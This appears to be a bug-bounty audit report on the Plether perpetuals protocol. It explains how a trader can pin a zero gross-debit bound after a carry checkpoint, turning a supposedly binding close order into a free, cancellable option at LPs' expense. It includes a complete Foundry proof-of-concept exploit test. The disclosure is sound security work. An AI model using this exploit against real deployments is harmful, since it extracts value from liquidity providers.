# \#99392 [SC-Low] Trader-controlled execution bounds let a trader cancel a binding order after its fill price is known, turning queued closes into a zero-cost free option paid for by LPs

**Submitted on Nov 13th 2026 at 13:32:39 UTC by @godwinudo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99392
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
Plether's delayed-order model relies on one stated invariant: once an order is committed, the trader cannot cancel it, so the trader cannot wait to see the fill price and then walk away. The trader-pinned `ExecutionBounds` break this. The gross-debit bound is checked at commit only against the carry pending at that moment, but at execution it is checked against the carry accrued since. A trader can therefore commit a close with `maxGrossAccountDebitAssets = 0` immediately after checkpointing carry with `withdraw(account, 0)`. Any execution by a third party in a later second accrues at least one atom of carry, fails the bound, and is classified as a terminal failure, which deletes the order at no cost to the trader. The trader alone can still fill it at the original, already-public tick by checkpointing carry in the same second as their own `executeOrder`. The result is an information-conditional cancellation: the trader keeps the stale fill when the market has since moved against them, and lets the order die and re-commits when it has moved in their favour. The difference is paid by LPs, the counterparty to every trade.

## Vulnerability Details
Plether has no same-transaction market orders. A trader commits a typed request to `OrderRouter`, and a keeper later executes the global FIFO head against the first unique Pyth tick strictly after the recorded `commitTime`. The protocol's defence against delayed-order free options is that the committed intent is binding. `SECURITY.md` lists this in its invariant table ("Router and reservation accounting"):

> | Binding intents | Users cannot cancel queued orders once committed |

and states the security property that depends on it, in the "Delayed-order model" section:

> - binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options,

The whitepaper repeats it in §6.1 ("5. The binding, user-uncancellable order becomes the global FIFO head in turn") and notes that "Delayed settlement is a recognized defense against oracle latency exploitation, while finite settlement windows limit the option value given to the trader." `ACCOUNTING_SPEC.md` says the same: "Users cannot cancel a binding ordinary order."

Every V3 request carries trader-supplied financial bounds. One of them, `maxGrossAccountDebitAssets`, caps everything the order may debit from the account, and zero is a valid value:

```solidity
// OrderV3Types.sol
/// @notice Mandatory financial authority supplied with every V3 order.
/// @dev Maximum values are inclusive and zero is a real zero allowance. Minimum values are inclusive.
///      `maxGrossAccountDebitAssets` covers settlement debit, trader-claim consumption, and the reserved bounty;
struct ExecutionBounds {
    ...
    uint256 maxGrossAccountDebitAssets;
    ...
}
```

At commit, the only gross-debit check for a close is against the carry the commit itself collects plus the (zero) close bounty. The lifecycle Book records it like this:

```solidity
// OrderLifecycleBook.sol — recordCommitment
uint256 gross = effects.carryCollectedAssets + pending.executionBountyAssets;
if (gross > pending.bounds.maxGrossAccountDebitAssets) {
    revert OrderLifecycleBook__CommitmentBoundExceeded(
        OrderV3Types.ConstraintKind.GrossAccountDebit, gross, pending.bounds.maxGrossAccountDebitAssets
    );
}
```

`carryCollectedAssets` is whatever carry is pending at that instant. Carry accrues continuously on every open position with a nonzero borrow base, `pendingCarryAssets = unsettledCarryAssets + floor(borrowBaseAssets * (currentSideCarryIndex - positionLastCarryIndex) / 1e18)` (`ACCOUNTING_SPEC.md`, "LP-Capital Carry"), and the owner can zero it at will. `MarginClearinghouse.withdraw` accepts a zero amount and checkpoints carry before running its checks:

```solidity
// MarginClearinghouse.sol
/// @notice Debits the caller's margin account and transfers settlement settlement token to the caller.
/// @dev `account` must equal `msg.sender`. Before transfer, the function checkpoints carry, applies the engine's
///      withdrawal guard when configured, and verifies the remaining settlement balance covers all locked
///      buckets. A zero amount is permitted but still runs those checks and hooks.
function withdraw(address account, uint256 amount) external nonReentrant {
    _withdraw(account, msg.sender, amount);
}

function _withdraw(address account, address owner, uint256 amount) internal {
    if (owner != account) {
        revert MarginClearinghouse__NotAccountOwner();
    }
    ...
    _checkpointCarryBeforeMarginChange(account);
    ...
}
```

While a position is open, the withdrawal guard needs a fresh engine mark, which anyone can install through the permissionless `OrderRouter.updateMarkPrice`. The close commitment itself also checkpoints carry (`OrderRouterBase._reserveCloseExecutionBounty`: "Delegates zero-bounty close admission and carry checkpointing to the engine"), so any carry still pending at commit is collected and counted against the bound. A trader who refreshes the mark, calls `withdraw(account, 0)` and then `commitOrder` in the same second therefore commits a close with `maxGrossAccountDebitAssets = 0` without error. The binding tick, the first unique Pyth tick after `commitTime`, is published within about a second and is public.

At execution, the policy evaluator re-assesses the gross debit, and this time it includes the carry realized **at execution time**:

```solidity
// CfdOrderPolicyEvaluatorBase.sol — close assessment
assessment.grossAccountDebitAssets = delta.pricePnlClaimConsumedAssets + delta.pricePnlPledgeConsumedAssets
    + delta.realizedCarryAssets + delta.actionChargeCollectedAssets + executionBountyAssets;
...
// _includeCommitment
assessment.grossAccountDebitAssets += effects.carryCollectedAssets;
```

and enforces the trader's bound against it:

```solidity
// CfdOrderPolicyEvaluatorBase.sol — _enforceBounds
_requireMaximum(
    OrderV3Types.ConstraintKind.GrossAccountDebit,
    assessment.grossAccountDebitAssets,
    bounds.maxGrossAccountDebitAssets
);
```

For a full close that is in profit at the tick, price loss, claim consumption and the bounty are all zero, and action charges are withheld from the price gain rather than debited (`ACCOUNTING_SPEC.md`: "a price payout, after any action charge withheld from the gain"), so the only debit is carry. Carry is `floor(borrowBaseAssets * carryIndexDelta / 1e18)` (`PositionRiskAccountingLib.computeIndexedCarryAssets`), so as soon as at least one atom has accrued since the last checkpoint (one second for the position in the PoC), any execution violates `maxGrossAccountDebitAssets = 0`. The router's execution sidecar classifies that violation as terminal:

```solidity
// OrderRouterExecutionSidecar.sol — _classifyTypedFailure
if (
    selector == ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector
        && revertData.length == 100
) {
    uint256 constraint = _word(revertData, 4);
    if (constraint > 0 && constraint <= uint256(OrderV3Types.ConstraintKind.PostLeverage)) {
        classification.terminal = true;
        classification.reason = OrderV3Types.TerminalReason.ConstraintViolation;
        ...
    }
}
```

`SECURITY.md` ("Queue failure handling") confirms what a terminal failure does to a close: "exact-shape typed planner rejections, execution-mode violations, and financial-constraint violations fail terminally … ordinary close failure settles its zero Order record and pays no executor". The order is deleted, the position stays open, and the trader pays nothing. A keeper that reaches the order first does not execute the trader's close. It only kills it, spending gas for no reward, since close bounties are zero.

The trader, however, can still fill the order whenever they like before its deadline. They call `withdraw(account, 0)` and then the permissionless `executeOrder` in the same second. Realized carry is zero, the bound passes, and the close fills at the original binding tick, which is now seconds or tens of seconds old. The withdrawal guard accepts a mark up to the 60 s mark-staleness limit, which equals the default `maxExecutionWindowSeconds`, so the mark the trader installed at commit keeps this route open for the order's whole default window without any further refresh (a trader-side fill was confirmed at 5, 30 and 59 seconds after commit, provided no newer mark had been installed).

Put together, the committed close is not binding at all. After the tick is public, the trader watches the market. If it moves against them, they fill at the stale, better tick. If it moves in their favour, they do nothing: the next keeper attempt kills the order for free, and they re-commit an ordinary close that fills at the new, better price. Either way the trader gets, approximately, the better of the binding tick and the later market price. That is exactly the free option the binding rule exists to deny. The protocol pays for it, because the pool is the counterparty: every extra unit of trader price PnL is a unit of LP cash.

The developers recognised this class of attack and closed it for one bound only. `ACCOUNTING_SPEC.md` ("Funded settlement minimum for a pending flat open") freezes the settlement-minimum ledger for a pending flat open and explains why:

> This protection prevents owner withdrawals from manufacturing a settlement-minimum failure; it does not freeze market-dependent financial bounds.

The failure here is not market-dependent either. It is engineered by the owner: a bound the floor ledger does not cover is pinned to zero, the owner's own zero-amount withdrawal lets the order pass at commit and, whenever the owner chooses, at execution, and the passage of time makes everyone else's execution fail. The same root cause, trader-pinned bounds and planner checks reading live account state the owner can still change after commit, with violations classified as terminal, also appears to reach other bounds that read mutable account state, such as the post-position equity of a skew-reducing open whose VPI reserve is funded from free settlement that the owner can withdraw. This report demonstrates only the gross-debit lever, which is the cleanest: it costs nothing beyond gas, needs no special market conditions, and applies to every full close that is in profit at its tick and accrues carry.

Keepers can end any single instance of the option, but they cannot stop the trader from creating a new one. Each instance lasts until the first third-party execution attempt (which kills it), the first newer mark installed by anyone (which makes the old tick unexecutable), or the 60 s staleness limit, whichever comes first. Re-committing is free, so the trader can attach a fresh option to every exit, indefinitely.


## Impact Details

The issue breaks a core security invariant of the delayed-order model ("Users cannot cancel queued orders once committed") and the property built on it ("prevent traders from turning queued intents into free options"). That gives any trader a repeatable, near-zero-cost way to extract value from LPs on every full-close exit. The extraction per exit equals the favourable price move between the binding tick and the moment a keeper reaches the order. Its expected value is about `0.4 · σ · √L · notional`, where `L` is the keeper's latency. In the end-to-end PoC, a 700,000-unit LONG exits after a 5 bps favourable move within 5 seconds: the trader nets 348.92 USDG more after all fees than the protocol's binding rule allows, and the LP pool loses exactly 348.92 USDG more. The trader's cost is zero apart from gas and the Pyth update fee, and the keeper is paid nothing.

Unlike Cecuro HIGH-1, whose fill remains binding and can move either way, this lets the trader decide after the move, so the payoff is one-sided and its expected value strictly positive, as the PoC measures."


## Proof of Concept

## Proof of Concept

Test asserts:
- the keeper's execution of the kill-switch close fails terminally, at zero cost to the attacker, with the position untouched;
- the attacker re-commits and exits at the better tick;
- measured against the binding counterfactual, the attacker's extra gain net of all fees and the LP pool's extra loss both equal the edge computed from the price path alone (`700,000 × 5 bps = 350 USDG`, measured 348.92);
- the keeper received nothing.

Create a file at `packages/perps/test/perps/audit/Judge_BindingOrderFreeOptionE2E.t.sol`, paste in the code below, and run with:

```bash
forge test --root packages/perps --match-path "test/perps/audit/Judge_BindingOrderFreeOptionE2E.t.sol" -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice End-to-end PoC: a trader turns a "binding" close into a free option. Pinning
///         `maxGrossAccountDebitAssets = 0` right after a carry checkpoint makes any third-party execution fail
///         terminally at zero cost, so when the market moves in the trader's favour after the binding tick the order
///         dies and the trader re-commits at the better price. LPs (the counterparty) pay the difference.
/// @dev Full local protocol stack from BasePerpTest; v2.0.0 release economics (script/DeployPerpsArbitrumSepolia.s.sol
///      `_riskParams`, release manifest seeds and senior caps). Pyth is the only mocked external dependency; every
///      price is a staged Pyth publication submitted by a keeper or the trader through the public Router. The only
///      non-transaction cheat is one EVM snapshot used to measure the protocol's own binding-rule counterfactual.
contract Judge_BindingOrderFreeOptionE2ETest is BasePerpTest {

    // ---- Release configuration ----
    uint256 internal constant RELEASE_SEED_ASSETS = 1e6;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    // ---- Actors ----
    address internal constant LP_VICTIM = address(0x1B);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant KEEPER = address(0xC0FFEE);

    // ---- Sizes ----
    uint256 internal constant LP_DEPOSIT_ASSETS = 2_000_000e6;
    uint256 internal constant ATTACKER_FUNDING = 50_000e6;
    uint256 internal constant ATTACKER_MARGIN = 20_000e6;
    uint256 internal constant POSITION_SIZE = 700_000e18; // 35% one-sided skew, under the 40% cap

    // ---- Realistic FX-basket path (8 decimals) ----
    uint256 internal constant PRICE_OPEN = 1e8;
    uint256 internal constant PRICE_AT_CLOSE_COMMIT = 0.998e8; // basket -20 bps over 30 min: LONG in profit
    uint256 internal constant PRICE_BINDING_TICK = 0.998e8; // first tick after commit
    uint256 internal constant PRICE_AFTER_KEEPER_LATENCY = 0.9975e8; // a further -5 bps within seconds

    // ---- Timing ----
    uint256 internal constant HOLD_TIME = 30 minutes;
    uint256 internal constant KEEPER_LATENCY = 5; // seconds between the binding tick and the keeper's attempt
    uint256 internal constant KEEPER_LAG = 60;

    // ---- Tolerance: fee + VPI + carry differences between the two fills (<= 1% of the price edge) ----
    uint256 internal constant EDGE_TOLERANCE_BPS = 100;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = RELEASE_MAX_SENIOR_EXPOSURE_ASSETS;
        config.maxSeniorShareBps = RELEASE_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function test_E2E_KillSwitchCloseTurnsBindingOrderIntoFreeOption() public {
        // 1. LP victim funds the pool through the async junior vault; a keeper settles the epoch via the Router.
        _lpDeposit(LP_VICTIM, LP_DEPOSIT_ASSETS);

        // 2. Fresh attacker deposits margin and opens a LONG through Router commit -> keeper execute.
        settlementToken.mint(ATTACKER, ATTACKER_FUNDING);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(clearinghouse), ATTACKER_FUNDING);
        clearinghouse.deposit(ATTACKER, ATTACKER_FUNDING);
        vm.stopPrank();
        _commitAndKeeperExecute(_request(POSITION_SIZE, ATTACKER_MARGIN, false, type(uint256).max), PRICE_OPEN);

        // 3. Basket drifts -20 bps over 30 minutes; the attacker refreshes the mark through the public oracle path
        //    and checkpoints carry with withdraw(0).
        vm.warp(vm.getBlockTimestamp() + HOLD_TIME);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory markUpdate = _stage(PRICE_AT_CLOSE_COMMIT, vm.getBlockTimestamp());
        vm.startPrank(ATTACKER);
        router.updateMarkPrice(markUpdate);
        clearinghouse.withdraw(ATTACKER, 0);
        vm.stopPrank();
        uint256 commitTime = vm.getBlockTimestamp();

        // 4. Counterfactual on the same state: the protocol's binding rule. An ordinary close committed in the same
        //    second is filled by a keeper at the binding tick after the same keeper latency.
        uint256 snapshot = vm.snapshotState();
        OrderV3Types.OrderRequest memory ordinaryClose = _request(POSITION_SIZE, 0, true, type(uint256).max);
        vm.prank(ATTACKER);
        uint64 bindingId = router.commitOrder(ordinaryClose);
        _step();
        bytes[] memory bindingTick = _stage(PRICE_BINDING_TICK, vm.getBlockTimestamp());
        vm.warp(commitTime + 1 + KEEPER_LATENCY);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 attackerBeforeBinding = clearinghouse.balanceAssets(ATTACKER);
        uint256 poolBeforeBinding = settlementToken.balanceOf(address(pool));
        vm.prank(KEEPER);
        assertEq(uint8(router.executeOrder(bindingId, bindingTick).status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 attackerGainIfBinding = clearinghouse.balanceAssets(ATTACKER) - attackerBeforeBinding;
        uint256 poolLossIfBinding = poolBeforeBinding - settlementToken.balanceOf(address(pool));
        vm.revertToState(snapshot);

        // 5. Real path: in the same second the attacker commits the close pinning maxGrossAccountDebitAssets = 0
        //    (passes the commit-time projection because pending carry is 0). The binding tick is then published.
        OrderV3Types.OrderRequest memory killSwitchClose = _request(POSITION_SIZE, 0, true, 0);
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(killSwitchClose);
        _step();
        bindingTick = _stage(PRICE_BINDING_TICK, vm.getBlockTimestamp());

        // 6. Within KEEPER_LATENCY the market moves a further -5 bps in the attacker's favour, so the attacker does
        //    nothing. The keeper's attempt fails terminally: position untouched, attacker pays nothing.
        vm.warp(commitTime + 1 + KEEPER_LATENCY);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 attackerStart = clearinghouse.balanceAssets(ATTACKER);
        uint256 poolStart = settlementToken.balanceOf(address(pool));
        uint256 keeperStart = clearinghouse.balanceAssets(KEEPER);
        vm.prank(KEEPER);
        assertEq(uint8(router.executeOrder(closeId, bindingTick).status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(clearinghouse.balanceAssets(ATTACKER), attackerStart, "kill cost the attacker nothing");
        assertEq(publicLens.getPosition(ATTACKER).size, POSITION_SIZE, "position untouched");

        // 7. Attacker re-commits an ordinary close; a keeper fills it at the next tick (the better price).
        _commitAndKeeperExecute(_request(POSITION_SIZE, 0, true, type(uint256).max), PRICE_AFTER_KEEPER_LATENCY);
        assertEq(publicLens.getPosition(ATTACKER).size, 0, "attacker is flat");

        // 8. Impact versus the binding rule, against the edge computed from the price path alone. Both measured
        //    amounts are net of every fee, VPI and carry charge the protocol applied.
        uint256 attackerNetExtra = (clearinghouse.balanceAssets(ATTACKER) - attackerStart) - attackerGainIfBinding;
        uint256 lpExtraLoss = (poolStart - settlementToken.balanceOf(address(pool))) - poolLossIfBinding;
        uint256 expectedEdge = (POSITION_SIZE / 1e18) * (PRICE_BINDING_TICK - PRICE_AFTER_KEEPER_LATENCY) / 100;
        uint256 tolerance = expectedEdge * EDGE_TOLERANCE_BPS / 10_000;
        assertApproxEqAbs(attackerNetExtra, expectedEdge, tolerance, "attacker extra vs binding, net of fees");
        assertApproxEqAbs(lpExtraLoss, expectedEdge, tolerance, "LP extra loss vs binding");
        assertEq(clearinghouse.balanceAssets(KEEPER), keeperStart, "keeper spent gas for nothing (zero close bounty)");
    }

    // ---------------------------------------------------------------------------------------------------------
    // Public-interface helpers
    // ---------------------------------------------------------------------------------------------------------

    function _step() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _stage(
        uint256 price,
        uint256 publishTime
    ) internal returns (bytes[] memory update) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        update = new bytes[](1);
        update[0] = abi.encode(price);
    }

    function _lpDeposit(
        address lp,
        uint256 assets
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        uint256 id = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(id) + KEEPER_LAG);
        _step();
        bytes[] memory update = _stage(PRICE_OPEN, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
        vm.prank(lp);
        juniorVault.claimDeposit(id, assets, lp, lp);
    }

    function _request(
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 maxGrossDebit
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        uint256 window = router.maxExecutionWindowSeconds();
        r = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(keccak256(abi.encode(size, margin, isClose, maxGrossDebit, vm.getBlockTimestamp())))),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: maxGrossDebit,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commitAndKeeperExecute(
        OrderV3Types.OrderRequest memory request,
        uint256 tickPrice
    ) internal {
        vm.prank(ATTACKER);
        uint64 orderId = router.commitOrder(request);
        _step();
        bytes[] memory tick = _stage(tickPrice, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        assertEq(uint8(router.executeOrder(orderId, tick).status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

}
```

